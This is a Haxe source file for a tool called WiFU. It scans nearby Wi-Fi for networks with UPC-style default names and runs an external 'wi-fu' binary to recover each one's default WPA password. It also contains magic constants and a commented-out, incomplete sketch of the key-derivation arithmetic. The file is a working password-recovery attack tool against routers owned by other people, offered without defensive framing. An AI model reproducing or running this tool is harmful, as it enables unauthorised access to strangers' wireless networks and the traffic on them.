
import Sys.print;
import Sys.println;
import sys.io.Process;

using StringTools;
using om.util.ArrayUtil;

typedef WirelessInterface = {
    var id : Int;
    var name : String;
    var mac : String;
}

class WiFU {

    public static inline var MAGIC_24GHZ = 0xff8d8f20;
    public static inline var MAGIC_5GHZ = 0xffd9da60;
    public static inline var MAGIC0 = 0xb21642c9;
    public static inline var MAGIC1 = 0x68de3af;
    public static inline var MAGIC2 = 0x6b5fca6b;

    //public static inline var MAX0 = 9;
    //public static inline var MAX1 = 99;
    //public static inline var MAX2 = 9;
    //public static inline var MAX3 = 9999;

    public static var ESSID_EXPR(default,null) = ~/^(UPC[0-9]{7})$/g;

    /*
    static function generateSSID( essid : String, band : String ) {
        a = data[1] * 10 + data[2];
        b = data[0] * 2500000 + a * 6800 + data[3] + magic;
        return b - (((b * MAGIC2) >> 54) - (b >> 31)) * 10000000;
    }

    static function mangle() {
        uint32_t a, b;
        a = ((pp[3] * MAGIC1) >> 40) - (pp[3] >> 31);
        b = (pp[3] - a * 9999 + 1) * 11ll;
        return b * (pp[1] * 100 + pp[2] * 10 + pp[0]);
    }
    */

    public static function recoverPassword( essid : String, band : String ) {

        println( essid );

        var p = new Process( 'bin/wi-fu', [essid,band] );
        var e = p.stderr.readAll();
        if( e != null && e.length > 0 )
            error( e.toString() );
        var r = p.stdout.readAll().toString();
        p.close();

        println(r);

    }

    /**
        Searches wi-fu enabled networks.
    */
    public static function searchNetworks( adapter = "wlan0" )  : Array<String> {

        var p = new Process( 'iwlist', [adapter,"scan"] );
        var e = p.stderr.readAll();
        if( e != null && e.length > 0 )
            error( e.toString() );
        var r = p.stdout.readAll().toString();
        p.close();

        var networks = new Array<String>();
        for( line in r.split( '\n' ) ) {
            line = line.trim();
            if( line.startsWith( 'ESSID' ) ) {
                var essid = line.substr( line.indexOf( '"' )+1, 10 );
                if( ESSID_EXPR.match( essid ) )
                    networks.push( essid );
            }
        }

        return networks;
    }

    /**
        Returns info about available wireless interfaces.
    */
    public static function getWirelessInterfaces()  : Array<WirelessInterface> {

        var p = new Process( 'ip', ['link','show'] );
        var e = p.stderr.readAll();
        if( e != null && e.length > 0 )
            error( e.toString() );
        var r = p.stdout.readAll().toString();
        p.close();

        var expr = ~/([0-9]+): ([a-z0-9]+): (.+)$/;
        var lines = r.split( '\n' );
        var i = 0;
        var interfaces = new Array<WirelessInterface>();
        while( i < lines.length ) {
            var line = lines[i].trim();
            if( expr.match( line ) ) {
                var name = expr.matched(2);
                switch name {
                case 'lo', _ if( !name.startsWith('w') ): i += 2; continue;
                default:
                    var next = lines[i+1].trim();
                    var mac = next.substr( next.indexOf( ' ' )+1, 17 );
                    interfaces.push({
                        id: Std.parseInt( expr.matched(1) ),
                        name: name,
                        mac: mac
                    });
                }
            }
            i++;
        }

        return interfaces;
    }

    static function error( info : String, code = 1  ) {
        println( info );
        Sys.exit( code );
    }

    static function usage() {
        return 'Usage: wi-fu <command> [options]';
    }

    static function main() {

        var networks = new Array<String>();
        var interfaces = getWirelessInterfaces();
        for( _interface in interfaces ) {
            print( _interface.name+' ' );
            var found = searchNetworks( _interface.name );
            print( found.length+'\n' );
            print( '  '+found.join('\n  ')+'\n' );
            for( f in found ) if( !networks.contains(f) ) networks.push(f);
        }

        println( networks.length + ' wi-fu networks found\n' );

        for( essid in networks ) {
            println( essid );
            recoverPassword( essid, '24' );
        }
    }
}
